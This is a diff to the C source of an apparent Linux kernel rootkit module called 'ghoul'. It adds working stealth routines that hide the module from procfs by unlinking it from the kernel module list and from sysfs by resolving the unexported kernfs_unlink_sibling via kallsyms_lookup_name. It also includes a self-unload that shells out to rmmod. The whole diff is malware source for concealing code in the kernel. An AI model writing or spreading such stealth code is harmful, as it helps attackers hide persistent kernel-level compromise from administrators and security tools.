@@ -1,41 +1,92 @@
 #include <linux/module.h>
 #include <linux/slab.h>
+#include <linux/kallsyms.h>
 #include "load.h"
 #include "privileges.h"
 #include "hide.h"
 
-#ifdef HIDE_MODULE_FROM_LIST
+#ifdef HIDE_MODULE_PROCFS
 static struct list_head *prev_module;
-int is_hidden = 0;
+int is_hidden_procfs = 0;
 
-notrace void hide_self(void)
+__always_inline void hide_module_procfs(void)
 {
-    if (is_hidden)
+    if (is_hidden_procfs)
         return;
     
-    pr_info("ghoul: hiding self\n");
+    pr_info("ghoul: hiding module from procfs\n");
     prev_module = THIS_MODULE->list.prev;
     list_del(&THIS_MODULE->list);
-    is_hidden = 1;
+    is_hidden_procfs = 1;
 }
 
-notrace void show_self(void)
+__always_inline void show_module_procfs(void)
 {
-    if (!is_hidden)
+    if (!is_hidden_procfs)
         return;
     
-    pr_info("ghoul: showing self\n");
+    pr_info("ghoul: showing module in procfs\n");
     list_add(&THIS_MODULE->list, prev_module);
-    is_hidden = 0;
+    is_hidden_procfs = 0;
 }
 #else
-notrace void hide_self(void) { return; }
-notrace void show_self(void) { return; }
+__always_inline void hide_module_procfs(void) {}
+__always_inline void show_module_procfs(void) {}
 #endif
 
-notrace void unload_self(void)
+#ifdef HIDE_MODULE_SYSFS
+int is_hidden_sysfs = 0;
+
+void (*kernfs_unlink_sibling)(struct kernfs_node *kn) = NULL;
+int (*kernfs_link_sibling)(struct kernfs_node *kn) = NULL;
+
+__always_inline void hide_module_sysfs(void)
 {
-    // as kernel modules cannot unload themselves directly, a usermode helper is used
+    if (is_hidden_sysfs)
+        return;
+    
+    if (kernfs_unlink_sibling == NULL)
+        kernfs_unlink_sibling = (void (*)(struct kernfs_node *kn))kallsyms_lookup_name("kernfs_unlink_sibling");
+    
+    pr_info("ghoul: hiding module from sysfs\n");
+    kernfs_unlink_sibling(THIS_MODULE->mkobj.kobj.sd);
+
+    is_hidden_sysfs = 1;
+}
+
+__always_inline void show_module_sysfs(void)
+{
+    if (!is_hidden_sysfs)
+        return;
+    
+    if (kernfs_link_sibling == NULL)
+        kernfs_link_sibling = (int (*)(struct kernfs_node *kn))kallsyms_lookup_name("kernfs_link_sibling");
+    
+    pr_info("ghoul: showing module in sysfs\n");
+    kernfs_link_sibling(THIS_MODULE->mkobj.kobj.sd);
+
+    is_hidden_sysfs = 0;
+}
+#else
+__always_inline void hide_module_sysfs(void) {}
+__always_inline void show_module_sysfs(void) {}
+#endif
+
+notrace void hide_module(void)
+{
+    hide_module_procfs();
+    hide_module_sysfs();
+}
+
+notrace void show_module(void)
+{
+    show_module_procfs();
+    show_module_sysfs();
+}
+
+notrace void unload_module(void)
+{
+    // kernel modules cannot unload themselves directly, so a usermode helper is used
     char *argv[] = { "/bin/sh", "-c", "/sbin/rmmod ghoul", NULL };
     call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
